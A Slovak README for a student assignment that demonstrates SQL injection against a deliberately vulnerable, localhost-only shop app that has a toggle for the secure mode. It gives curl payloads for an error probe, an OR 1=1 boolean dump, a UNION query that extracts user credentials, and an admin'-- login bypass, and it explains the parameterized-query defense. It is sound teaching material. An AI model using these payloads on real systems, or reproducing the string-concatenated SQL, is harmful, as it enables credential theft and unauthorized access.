# BIAKS Zadanie 2 – webová aplikácia zraniteľná na SQL Injection

Zámerne zraniteľná aplikácia „BIAKS Shop" (internetový obchod) na demonštráciu útoku
SQL Injection a jeho opravy. **Iba na výučbové účely.** Server počúva len na `127.0.0.1`.

Aplikácia beží ako **jedna stránka** s prepínačom **SECURE** v hlavičke, ktorým sa za
behu (bez reštartu) prepína medzi zraniteľným a bezpečným správaním:

- **SECURE OFF** → zraniteľný režim – SQL sa skladá reťazcami (f-string).
- **SECURE ON** → bezpečný režim – parametrizované dotazy (placeholder `?`).

## Požiadavky

Len Python 3 zo štandardnej knižnice (`http.server`, `sqlite3`). Žiadne závislosti.
Databáza je v pamäti (`:memory:`), vytvorí sa pri štarte, na disk sa nič neukladá.

## Spustenie

```bash
python3 app.py            # štart v zraniteľnom režime -> http://127.0.0.1:8000/
python3 app.py --safe     # štart rovno v bezpečnom režime
python3 app.py --port 8080
```

Režim potom prepínaš **prepínačom SECURE** vpravo hore v stránke. Netreba spúšťať
dve inštancie ani reštartovať.

## Zraniteľné body

| Endpoint | Parameter | Vložený do SQL ako | Typ útoku |
|---|---|---|---|
| `GET /products?cat=1` | `cat` | číslo bez úvodzoviek | UNION / boolean |
| `GET /search?q=lampa` | `q` | reťazec v `LIKE '%...%'` | UNION |
| `POST /login` | `username`, `password` | reťazce v `'...'` | obídenie prihlásenia |

Aplikácia zámerne zobrazuje vykonaný SQL dotaz a vracia chybové hlášky databázy,
aby bol útok názorný (v reálnej aplikácii by to bol ďalší únik informácií).

## Ukážky útokov (overené, režim SECURE OFF)

```bash
# 1) Detekcia zraniteľnosti chybou – rozbije reťazec dotazu
curl "http://127.0.0.1:8000/products?cat=1'"
#   -> Chyba databázy: unrecognized token: "'"

# 2) Boolean – OR 1=1 vráti všetky produkty namiesto jednej kategórie
curl -G "http://127.0.0.1:8000/products" --data-urlencode "cat=5 OR 1=1--"
#   -> 7 záznamov

# 3) UNION – vytiahne prihlasovacie údaje z inej tabuľky
curl -G "http://127.0.0.1:8000/products" \
     --data-urlencode "cat=0 UNION SELECT username, password, role FROM users--"
#   -> admin | Sup3rTajneHeslo! | admin   atď.

# 4) Obídenie prihlásenia – komentár -- odstrihne kontrolu hesla
curl "http://127.0.0.1:8000/login" \
     --data-urlencode "username=admin'--" --data-urlencode "password=nepoznam"
#   -> Prihlásený ako admin (rola: admin)
```

Po prepnutí na **SECURE ON** vrátia tie isté požiadavky 0 záznamov, resp. „Nesprávne
meno alebo heslo" – vstup sa odošle oddelene ako hodnota parametra (`?`) a databáza ho
nikdy nevyhodnotí ako SQL.

## Obrana

Bezpečný režim (SECURE ON) používa **parametrizované dotazy** (`WHERE category_id = ?`
a hodnota v samostatnom argumente `execute`). Rozdiel oproti zraniteľnej vetve je vidno
priamo v `app.py` vo funkciách `query_products`, `query_search`, `query_login`.

## Dokumentácia

Kompletná dokumentácia s vysvetlením útokov a obrany: **`Radchenko.pdf`**.
